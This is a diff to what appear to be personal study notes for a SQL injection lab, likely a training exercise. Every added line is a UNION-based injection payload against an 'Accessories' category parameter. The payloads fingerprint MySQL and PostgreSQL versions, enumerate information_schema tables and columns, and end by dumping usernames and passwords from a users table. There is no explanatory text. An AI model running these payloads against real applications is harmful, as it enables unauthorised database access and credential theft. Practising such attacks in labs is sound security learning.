@@ -21,3 +21,21 @@ Accessories' union select @@version, 'def' --+
 
 // check mysql
 Accessories' union select @@version, 'def' --+
+
+// check posgressql
+Accessories' union select version(), 'def' --+
+
+// PostgreSQL
+PostgreSQL	
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+
+Accessories%27%20union%20select%20table_name,%20table_schema%20from%20information_schema.tables--+
+
+Accessories' union select table_name, table_schema from information_schema.tables where table_schema='public' --+
+
+Accessories' union select column_name, data_type from information_schema.columns where table_name='users_kuhiqd' --+
+Accessories' union select column_name, 'def' from information_schema.columns --+
+
+Accessories' union select username_qsizmn, password_xuavek from users_kuhiqd --+
